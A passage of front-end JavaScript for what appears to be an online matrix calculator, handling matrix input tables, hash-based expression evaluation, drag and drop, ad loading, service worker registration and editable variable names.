  if (state == undefined) {
    state = {
      mode: undefined,
      inputValues: [],
      textareaValue: "",
      rows: initialRows,
      cols: initialCols,
      textareaStyleWidth: undefined,
      textareaStyleHeight: undefined
    };
  }
  //TODO: do we need a title attribute at insert-table and why if we have <legend> ?
  var x = new MatrixTable(id, initialRows, initialCols, type, element, state);
  MatrixTables[id] = x;
  //element.style.visibility = "hidden";
  var modeKey = "~" + window.location.pathname + "~" + id + "~" + "mode";
  var mode = keyStorage.getItem(modeKey);
  if (mode == undefined) {
    mode = x.mode;
  }
  x.mode = mode;
  x.insert(state.inputValues, state.textareaValue, state.rows, state.cols, state.textareaStyleWidth, state.textareaStyleHeight, state.mode, state.variableNames);
  //element.style.visibility = "";
  x.onmodechange = function () {
    keyStorage.setItem(modeKey, x.mode);
  };
  x.onswapmode = function () {
    var newMode = x.mode === "cells" ? "" : "cells";
    RPNProxy.getElementsArray(x.getDataState(), function (result) {
      var elements = result.elements;
      var variableNames = result.variableNames;
      x.insert(elements, undefined, undefined, undefined, undefined, undefined, newMode, variableNames);
    });
  };
  DnD.initializeDropZone(element);

  if (window.history.replaceState != undefined) {
    window.addEventListener("pagehide", function (event) {
      var historyState = Object.assign({}, window.history.state);
      historyState[stateKey1] = x.getState();
      window.history.replaceState(historyState, document.title, window.location.href);
    }, false);
  }

});

Utils.on("click", ".expression-button", onExpressionClick);

Utils.on("click", ".expression-input-button", onExpressionClick);

Utils.initialize(".expression-input-container", function (element) {
  var input = element.querySelector("input");

  input.addEventListener("input", function (event) {
    event.target.style.width = Math.max(21, (event.target.value.length * 0.7)).toString() + "em";
  }, false);

  if (input.value === input.getAttribute("value")) { // autofill
    //input.disabled = true;
    var value = keyStorage.getItem("expression");
    if (value != undefined && value !== "") {
      input.value = value;
    }
    input.addEventListener("input", function (event) {
      var input = event.target;
      checkInput(input, "");
    }, false);
    checkInput(input, "");
    //input.disabled = false;
  }

  // transformation of multi-line form into single-line form
  input.addEventListener("drop", DnD.onDropOrPaste, false);
  input.addEventListener("paste", DnD.onDropOrPaste, false);
});

var encodeLocationHash = function (hash) {
  // comments systems, other software with "auto-link" feature may work not good with some characters ...
  return encodeURIComponent(hash).replace(/\!/g, "%21")
                                 .replace(/'/g, "%27")
                                 .replace(/\(/g, "%28")
                                 .replace(/\)/g, "%29")
                                 .replace(/\*/g, "%2A")
                                 .replace(/\./g, "%2E")
                                 .replace(/~/g, "%7E")
                                 .replace(/%2C/g, ",")
                                 .replace(/%2F/g, "/"); // 2018-07-09
};

// https://stackoverflow.com/questions/7449588/why-does-decodeuricomponent-lock-up-my-browser
function decodeURIComponentSafe(s) {
  // TODO: non-throwing in all cases implementation
  // determinant-Gauss%28%7B%7B0,z,y,u%7D,%7Bz,z,u%2By,u%2By%7D,%7Bu%2By,u%2By,z,z%7D,%7Bu,y,z,0%7D%7D%29
  return decodeURIComponent(s.replace(/%(?![0-9A-Fa-f][0-9A-Fa-f])/g, '%25'));
}

var decodeLocationHash = function (hash) {
  try {
    return decodeURIComponentSafe(hash);
  } catch (error) {
    window.onerror(error.message + " : " + hash, "", 0, 0, error);
  }
  return "";
};

var lastHash = "";

var onHashChange = function (event) {
  var hash = decodeLocationHash(window.location.hash.slice(1));
  if (lastHash === hash) {
    return;
  }
  lastHash = hash;

  if (document.getElementById(hash) != undefined) {
    return;
  }
  //TODO: (?)
  if (/^hcm\=\d+$/.exec(hash) != undefined) { // || document.getElementById(hash) != undefined
    return;
  }
  if (/^[\-\da-zA-Z]*system_1$/.exec(hash) != undefined) { // || document.getElementById(hash) != undefined
    return;
  }
  if (hash.trim() === "") {
    return;
  }

  var actHistoryId = (actHistoryStorage.actHistoryId += 1);
  var printOptions = {idPrefix: "i" + actHistoryId.toString(), fractionDigits: decimalFractionDigits};
  //TODO: FIX!!!
  RPNProxy.runExpression(hash, undefined, undefined, undefined, printOptions, function (result) {
    var resultError = result.resultError;
    var details = result.details;
    var expressionString = result.expressionString;
    var resultHTML = result.resultHTML;
    var resultMatrix = result.resultMatrix;
    var detailsHTML = result.detailsHTML;
    if (resultError == undefined) {
      var previousItem = actHistoryStorage.getPreviousItem();
      //...
      // TODO: FIX!!! It is wrong to compare HTML here, as "Expression.id()" generates different HTML each time
      if (previousItem == undefined || (previousItem.resultHTML !== resultHTML && previousItem.expressionString !== expressionString)) {
        zInsAct(resultHTML, resultMatrix, details, expressionString, actHistoryId, detailsHTML, false);
      }
    } else {
      //if (resultError.message.indexOf("UserError:") === 0) {
        //ignore
      //} else {
        var positionInfo = RPNProxy.getPositionInfo();
        handleError(hash, "location.hash", resultError, positionInfo);
      //}
    }
  });
};

Utils.initialize(".from-cookie", function (element) {

  // TODO: insert after the <details> element expansion - ? and calculate - ?
  var examples = document.getElementById("examples");
  if (examples != undefined) {
    var list = examples.querySelectorAll("a");
    for (var i = 0; i < list.length; i += 1) {
      var s = list[i].textContent;
      var html = "";
      if (s === "{{11,3},{7,11}}*{{8,0,1},{0,3,5}}") {
        html = '<mrow><mrow><mo>(</mo><mtable rowspacing="0ex"><mtr><mtd><mn>11</mn></mtd><mtd><mn>3</mn></mtd></mtr><mtr><mtd><mn>7</mn></mtd><mtd><mn>11</mn></mtd></mtr></mtable><mo>)</mo></mrow><mo>&times;</mo><mrow><mo>(</mo><mtable rowspacing="0ex"><mtr><mtd><mn>8</mn></mtd><mtd><mn>0</mn></mtd><mtd><mn>1</mn></mtd></mtr><mtr><mtd><mn>0</mn></mtd><mtd><mn>3</mn></mtd><mtd><mn>5</mn></mtd></mtr></mtable><mo>)</mo></mrow></mrow>';
      } else if (s === "determinant({{1,2,3},{4,5,6},{7,2,9}})") {
        html = '<mrow><mo>|</mo><mtable rowspacing="0ex"><mtr><mtd><mn>1</mn></mtd><mtd><mn>2</mn></mtd><mtd><mn>3</mn></mtd></mtr><mtr><mtd><mn>4</mn></mtd><mtd><mn>5</mn></mtd><mtd><mn>6</mn></mtd></mtr><mtr><mtd><mn>7</mn></mtd><mtd><mn>2</mn></mtd><mtd><mn>9</mn></mtd></mtr></mtable><mo>|</mo></mrow>';
      } else if (s === "{{1,2},{3,4}}^-1") {
        html = '<msup><mrow><mo>(</mo><mtable rowspacing="0ex"><mtr><mtd><mn>1</mn></mtd><mtd><mn>2</mn></mtd></mtr><mtr><mtd><mn>3</mn></mtd><mtd><mn>4</mn></mtd></mtr></mtable><mo>)</mo></mrow><mrow><mo>(</mo><mrow><mo>&minus;</mo><mn>1</mn></mrow><mo>)</mo></mrow></msup>';
      } else if (s === "{{1,2,3},{4,5,6},{7,2,9}}^-1") {
        html = '<msup><mrow><mo>(</mo><mtable rowspacing="0ex"><mtr><mtd><mn>1</mn></mtd><mtd><mn>2</mn></mtd><mtd><mn>3</mn></mtd></mtr><mtr><mtd><mn>4</mn></mtd><mtd><mn>5</mn></mtd><mtd><mn>6</mn></mtd></mtr><mtr><mtd><mn>7</mn></mtd><mtd><mn>2</mn></mtd><mtd><mn>9</mn></mtd></mtr></mtable><mo>)</mo></mrow><mrow><mo>(</mo><mrow><mo>&minus;</mo><mn>1</mn></mrow><mo>)</mo></mrow></msup>';
      }
      //html = Expression.p(s, undefined, {idPrefix: "g", useMatrixContainer: false});
      list[i].innerHTML = "<math>" + html + "</math>";
    }
  }

  actHistoryStorage.load(function (storedActHistory) {
    var exampleAttribute = element.getAttribute("data-example");
    var needsExample = exampleAttribute != undefined;
    var oldVersion = ActHistoryItem.version;
    if (true) {
      for (var actHistoryId in storedActHistory) {
      if (Object.prototype.hasOwnProperty.call(storedActHistory, actHistoryId)) {
        var storedActHistoryItem = storedActHistory[actHistoryId].item;
        if (storedActHistoryItem != null) {//! some strange issue in Safari

        storedActHistoryItem.resultHTML = storedActHistoryItem.resultHTML;
        storedActHistoryItem.detailsHTML = storedActHistoryItem.detailsHTML;

        zInsAct(storedActHistoryItem.resultHTML,
                storedActHistoryItem.resultMatrix,
                storedActHistoryItem.details,
                storedActHistoryItem.expressionString,
                actHistoryId,
                storedActHistoryItem.detailsHTML,
                true);
        needsExample = false;
        oldVersion = Math.min(oldVersion, storedActHistoryItem.oldVersion);
        if (storedActHistoryItem.expressionString == undefined) {
          oldVersion = -1;
        }
        }
      }
      }
      //if (oldVersion !== ActHistoryItem.version) {
        //..
      //}
      if (storedActHistory.length !== 0) {
        hit({version: "version-" + oldVersion});
      }
    }
    window.addEventListener("hashchange", onHashChange, false);
    onHashChange(undefined);
    needsExample = needsExample && actHistoryStorage.size() === 0;
    if (needsExample) {
      var printOptions = {idPrefix: "g"};
      RPNProxy.runExpression("{{5,8,-4},{6,9,-5},{4,7,-2}}*{{2},{-3},{1}}", undefined, undefined, undefined, printOptions, function (result) {
        if (result.resultError == undefined) {
          // TODO: loading or not loading - ?
          var actHistoryId = "#" + result.resultMatrix;
          zInsAct(result.resultHTML, result.resultMatrix, result.details, result.expressionString, actHistoryId, result.detailsHTML, true);
          //! Note:
          //! No need to save the example
        } else {
          handleError("", "", result.resultError, {});
        }
      });
    }
  });

  var pathname = window.location.pathname;
  var links = document.querySelector(".menu").querySelectorAll("a");
  for (var i = 0; i < links.length; i += 1) {
    if (links[i].pathname === pathname) {
      links[i].setAttribute('aria-current', 'page');
    }
  }
});

// --------------------------------------------- end ----------------------------------------------

//  Drag and Drop + Copy and Paste

var toggleValidDropTarget = function (force) {
  //document.body.classList.toggle("drop-target", force);
  var dropzones = document.querySelectorAll(".matrix-table");
  for (var i = 0; i < dropzones.length; i += 1) {
    dropzones[i].classList.toggle("valid-drop-target", force);
  }
  var expressionInput = document.getElementById("expression");
  if (expressionInput != undefined) {
    expressionInput.classList.toggle("valid-drop-target", force);
  }
  var addTableButton = document.querySelector(".add-table");
  if (addTableButton != null) {
    addTableButton.classList.toggle("valid-drop-target", force);
  }
};
var onDragOverOrDragEnd = function (event) {
  // if (event.dataTransfer.types.indexOf('text/plain') === -1) {
  //   return;
  // }
  var key = "data-drop-target-timeout";
  var a = Number.parseInt(document.body.getAttribute(key) || 0, 10) || 0;
  if (a !== 0) {
    window.clearTimeout(a);
  } else {
    toggleValidDropTarget(true);
  }
  a = window.setTimeout(function () {
    toggleValidDropTarget(false);
    document.body.setAttribute(key, "0");
  }, event.type === "dragend" ? 0 : 600);
  document.body.setAttribute(key, a.toString());
};

document.addEventListener("dragover", onDragOverOrDragEnd, false);
document.addEventListener("dragend", onDragOverOrDragEnd, false);

//
  
var arrowWithLabelInitialize = function (arrowWithLabel) {
  var arrow = arrowWithLabel.querySelector(".arrow");
  var table = arrowWithLabel.previousElementSibling.querySelector("mtable");
  var start = Number.parseInt(arrowWithLabel.getAttribute("data-start"), 10);
  var end = Number.parseInt(arrowWithLabel.getAttribute("data-end"), 10);
  var n = 0;
  var row = table.firstElementChild;
  var startRow = undefined;
  var endRow = undefined;
  while (row != undefined) {
    if (n === start) {
      startRow = row;
    }
    if (n === end) {
      endRow = row;
    }
    n += 1;
    row = row.nextElementSibling;
  }
  var startRowRect = startRow.getBoundingClientRect();
  var endRowRect = endRow.getBoundingClientRect();
  var tableRect = table.getBoundingClientRect();
  if (end < start) {
    var tmp = endRowRect;
    endRowRect = startRowRect;
    startRowRect = tmp;
  }
  var arrowHeight = ((endRowRect.top + endRowRect.bottom) / 2 - (startRowRect.top + startRowRect.bottom) / 2);
  var arrowWithLabelVerticalAlign = ((tableRect.top + tableRect.bottom) / 2 - (startRowRect.top + endRowRect.bottom) / 2);
  window.setTimeout(function () {
    arrow.style.height = arrowHeight.toString() + "px";
    arrow.style.top = "50%";
    arrow.style.marginTop = (-arrowHeight / 2).toString() + "px";
    arrowWithLabel.style.verticalAlign = arrowWithLabelVerticalAlign.toString() + "px";
  }, 0);
};

document.addEventListener("custom-paint", function (event) {
  if (event.target.getAttribute("data-custom-paint") === "arrow-with-label") {
    arrowWithLabelInitialize(event.target);
  }
}, false);

if ("navigationMode" in window.history) {
  window.history.navigationMode = "fast"; // - Opera Presto
}

Utils.initialize(".ads-container", function (adsContainer) {

  var isConnectionOK = function () {
    // doNotTrack - 8%
    // "slow-2g" + "2g" - 2.5%
    // saveData - 18%
    var connection = window.navigator.connection || {};
    var effectiveType = connection.effectiveType;
    return window.location.protocol !== "file:" &&
           window.navigator.doNotTrack !== "1" &&
           effectiveType !== "slow-2g" &&
           effectiveType !== "2g" &&
           connection.saveData !== true;
  };

  if (isConnectionOK() && false) {
    window.setTimeout(function () {
      (window["yandex_metrika_callbacks"] = window["yandex_metrika_callbacks"] || []).push(function() {
        try {
          yaCounter = new Ya.Metrika({
            id: 29787732,
            clickmap: true,
            trackLinks: true,
            accurateTrackBounce: true,
            trackHash: true,
            webvisor: false,
            params: {}
          });
          window.yaCounter29787732 = yaCounter;
          if (yaCounter != undefined) {
            requestIdleCallback("sendHits", sendHits, 1000);
          }
        } catch (error) {
          console.log(error);
        }
      });
      Utils.appendScript("https://mc.yandex.ru/metrika/watch.js");
    }, 0);
  } else {
    hitQueue = undefined;
  }

  var element = adsContainer.querySelector(".adsbygoogle-container");
  var toggleAdsButton = adsContainer.querySelector(".toggle-ads-button");
  if (toggleAdsButton == null) { // TODO: remove
    toggleAdsButton = document.createElement("div");
    toggleAdsButton.appendChild(document.createElement("div"));
  }

  var browserIsOK = "ar bg gl zh mk vi tr".indexOf(document.documentElement.lang) === -1 &&
                    window.matchMedia != undefined &&
                    isConnectionOK() &&
                    window.opera == undefined; // loading indicator in Opera
  var showAds = false;
  var mediaIsOK = false;
  var prefersReducedMotion = false;

  var isInserted = false;
  var loadAds = function () {
    if (browserIsOK && mediaIsOK && !prefersReducedMotion && showAds) {
      if (!isInserted) {
        isInserted = true;
        var xhr = new XMLHttpRequest();
        xhr.open("GET", (document.documentElement.lang === "ru" ? "." : "..") + "/ads.json");
        xhr.onload = function () {
          var x = undefined;
          var a = JSON.parse(xhr.responseText);
          var lang = document.documentElement.lang;
          var now = Date.now();
          for (var i = 0; i < a.length; i += 1) {
            var item = a[Math.floor(Math.random() * a.length)];
            if ((lang === item.lang || item.lang === "*") && Math.random() < item.probability && now < item.endTime) {
              x = item;
            }
          }
          if (x != undefined) {
            if (x.videoId !== "") {
              element.innerHTML = "<div id=\"player\"></div>";
              window.onYouTubeIframeAPIReady = function () {
                var done = false;
                var player = new YT.Player("player", {
                  height: "200",
                  width: "200",
                  videoId: x.videoId,
                  events: {
                    onStateChange: function (event) {
                      if (event.data >= 0 && !done) {
                        hit({click: "youtube-click"});
                        done = true;
                      }
                    }
                  }
                });
              };
              Utils.appendScript("https://www.youtube.com/iframe_api");
            } else if (x.html !== "") {
              element.innerHTML = x.html;
            }
          } else {
            (window.adsbygoogle = window.adsbygoogle || []).push({});
            Utils.appendScript("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js");
          }
        };
        xhr.send();
      }
    }
    toggleAdsButton.hidden = !browserIsOK || !mediaIsOK || prefersReducedMotion;
  };

  if (browserIsOK) {    
    window.setTimeout(function () {
      var updateUI = function () {
        toggleAdsButton.firstElementChild.hidden = !showAds;
        toggleAdsButton.lastElementChild.hidden = showAds;
        element.hidden = !showAds;
      };

      var value = keyStorage.getItem("show-ads");
      showAds = value == undefined || value === "true";
      updateUI();
      loadAds();
      toggleAdsButton.addEventListener("click", function () {
        showAds = !showAds;
        keyStorage.setItem("show-ads", showAds ? "true" : "false");
        updateUI();
        loadAds();
        hit({click: "show-ads-" + showAds});
      }, false);

      var mediaQueryList = window.matchMedia("screen and (max-width: 800px)");  // see style.css
      var checkMedia = function () {
        if (!mediaQueryList.matches) {
          mediaQueryList.removeListener(checkMedia);
          mediaIsOK = true;
          loadAds();
        }
      };
      mediaQueryList.addListener(checkMedia);
      checkMedia();
    }, 0);
  } else {
    toggleAdsButton.hidden = true;
  }

  //TODO: move
  if (window.matchMedia != undefined) {
    window.setTimeout(function () {
      var mediaQueryList = window.matchMedia("(prefers-reduced-motion)");
      var checkMedia = function () {
        if (mediaQueryList.matches) {
          mediaQueryList.removeListener(checkMedia);
          prefersReducedMotion = true;
          Element.prototype.animate = undefined;
          loadAds();
          hit({click: "prefers-reduced-motion"});
        }
      };
      mediaQueryList.addListener(checkMedia);
      checkMedia();
    }, 0);
  }

});

if (window.location.protocol !== "file:") {
  var useAppCache = function () {
    document.addEventListener("DOMContentLoaded", function (event) {
      // https://www.youtube.com/watch?v=IgckqIjvR9U&t=1005s
      var iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = "load-appcache.html";
      document.body.appendChild(iframe);
    }, false);
  };
  if (("serviceWorker" in window.navigator)) {
    var serviceWorker = undefined;
    try {
      serviceWorker = window.navigator.serviceWorker;
    } catch (error) {
      if (error.name !== "SecurityError") {
        throw error;
      }
    }
    if (serviceWorker != undefined && serviceWorker.register != undefined) {
      var promise = serviceWorker.register("sw.js", {scope: "./"});
      if (promise.then != undefined) {
        promise.then(function (registration) {
          console.log("ServiceWorker registration succeeded:", registration);
        })["catch"](function (error) {
          useAppCache();
          console.log("ServiceWorker registration failed:", error);
        });
      }
      //TODO:
      //serviceWorker.addEventListener('controllerchange', function() {
      //  window.location.reload();
      //});
    } else {
      useAppCache();
    }
  } else {
    useAppCache();
  }
}

window.addEventListener("beforeinstallprompt", function (event) {
  event.preventDefault(); // most of users do not accept it
  //if (event.userChoice != undefined) {
  //  event.userChoice.then(function (choiceResult) {
  //    hit({beforeinstallprompt: choiceResult.outcome});
  //  });
  //}
  hit({beforeinstallprompt: "show"});

  var installButton = document.getElementById('a2hs-button');
  if (installButton != null) {
    installButton.addEventListener('click', function (mouseEvent) {
      event.prompt();
    }, false);
    installButton.hidden = false;
  }
}, false);

document.addEventListener("DOMContentLoaded", function (event) {
  if (window.navigator.share != undefined) {
    var shareButton = document.getElementById('share-button');
    if (shareButton != null) {
      shareButton.addEventListener("click", function (event) {
        window.navigator.share({
          title: decodeURIComponent(shareButton.getAttribute("data-text")),
          url: decodeURIComponent(shareButton.getAttribute("data-url"))
        });
      }, false);
      shareButton.hidden = false;
    }
  }
}, false);

Utils.on("click", ".share-item-button", function (event) {
  var actHistoryId = this.getAttribute("data-act-history-id");
  var item = actHistoryStorage.getItem(Number.parseInt(actHistoryId, 10));
  window.navigator.share({
    url: "#" + encodeLocationHash(item.expressionString)
  });
});

Utils.initialize(".more-button", function (button) {
  var container = button.previousElementSibling;
  button.addEventListener("click", function (event) {
    container.hidden = !container.hidden;
    button.setAttribute("aria-expanded", container.hidden ? "true" : "false");
  }, false);
});

//! 2018-03-20
var onMatrixTable = function () {
  //!
  var matrixMenu = document.getElementById("matrix-menu");
  if (matrixMenu != undefined) {
    matrixMenu.parentNode.removeChild(matrixMenu);
  }
  var matrixMenuDialog = document.getElementById("matrix-menu-dialog");
  if (matrixMenuDialog != undefined) {
    matrixMenuDialog.parentNode.removeChild(matrixMenuDialog);
  }
};

//button
Utils.initialize(".add-table", function (element) {
  element.addEventListener("click", function (event) {
  hit({click: "add-table"});
  var id = undefined;
  for (var c = "A"; c <= "Z"; c = String.fromCharCode(c.charCodeAt(0) + 1)) {
    if (id == undefined && MatrixTables[c] == undefined) {
      id = c;
    }
  }
  if (id != undefined) {
    var newNode = document.getElementById("add-table-template").content.firstElementChild.cloneNode(true);
    newNode.querySelector(".table-id").textContent = id;
    newNode.querySelector(".remove-table").setAttribute("data-id", id);
    newNode.querySelector(".insert-table").setAttribute("data-id", id);
    document.querySelector(".main").firstElementChild.appendChild(newNode);
    Utils.check(newNode);
    onMatrixTable();
  }
  }, false);

  //!new 2019-01-06
  // Note: "paste" event is not working in Chrome 71?
  DnD.initializeDropZone(element);
});
//button
Utils.on("click", ".remove-table", function (event) {
  hit({click: "remove-table"});
  var id = event.target.getAttribute("data-id");
  delete MatrixTables[id];
  var tables = document.querySelectorAll(".matrix-table");
  for (var i = 0; i < tables.length; i += 1) {
    var table = tables[i];
    if (table.getAttribute("data-id") === id) {
      var e = table.parentNode.parentNode;
      e.parentNode.removeChild(e);
    }
  }
  //TODO: pagehide listener - ?
  //TODO: restore from the history state -?
  onMatrixTable();
});

  function makeContent(variableName) {
    var i = variableName.indexOf("_");
    if (i === -1) {
      return '<mi>${x}</mi>'.replace(/\$\{x\}/g, variableName);
    }
    var t = '<msub><mi>${x}</mi><mn>${i}</mn></msub>';
    return t.replace(/\$\{x\}/g, variableName.slice(0, i)).replace(/\$\{i\}/g, variableName.slice(i + 1));
  }

Utils.initialize(".editable-on-click", function (element) {
  element.innerHTML = '<button type="button"></button><input type="text" pattern="[a-z](?:_\d)?" autocapitalize="off" autocomplete="off" spellcheck="false" hidden />';
  var button = element.querySelector("button");
  var input = element.querySelector("input");
  button.innerHTML = '<math>' + makeContent(element.getAttribute('data-value')) + '</math>';
  // Firefox will not insert a new character into the <input> if to switch during "keypress"
  element.addEventListener("keydown", function (event) {
    if (!event.defaultPrevented && !event.ctrlKey && !event.shiftKey && !event.metaKey && !event.altKey) {
      var charCode = String.fromCharCode(event.keyCode).toLowerCase().charCodeAt(0);
      if (charCode >= "a".charCodeAt(0) && charCode <= "z".charCodeAt(0)) {
        if (!button.hidden) {
          button.click();
        }
      }
    }
  }, false);
  function updateValue() {
    var value = input.value.trim();
    element.setAttribute("data-value", value);
    button.innerHTML = '<math>' + makeContent(value) + '</math>';
    var changeEvent = document.createEvent("Event");
    changeEvent.initEvent("change-value", false, false);
    element.dispatchEvent(changeEvent);
  }
  element.addEventListener("click", function (event) {
    if (!event.defaultPrevented) {
      event.preventDefault();
      button.hidden = true;
      input.hidden = false;
      input.focus();
      input.select();
      input.addEventListener("blur", function (event) {
        var value = input.value.trim();
        if (element.getAttribute("data-value") !== value && value !== "") {
          updateValue();
        }
        button.hidden = false;
        input.hidden = true;
      }, false);
      input.addEventListener("keydown", function (event) {
        var DOM_VK_RETURN = 13;
        var DOM_VK_ESCAPE = 27;
        if (event.keyCode === DOM_VK_ESCAPE) {
          input.value = element.getAttribute("data-value");
          event.preventDefault();
          button.hidden = false;
          button.focus();
          input.hidden = true;
        }
        if (event.keyCode === DOM_VK_RETURN) {
          if (input.value.trim() === "") {
            input.value = element.getAttribute("data-value");
          }
          event.preventDefault();
          updateValue();
          button.hidden = false;
          button.focus();
          input.hidden = true;
        }
      }, false);
      input.addEventListener("input", function (event) {
        input.style.width = (input.value.length + 2) + "ch";
      }, false);
    }
  }, false);
});

}());
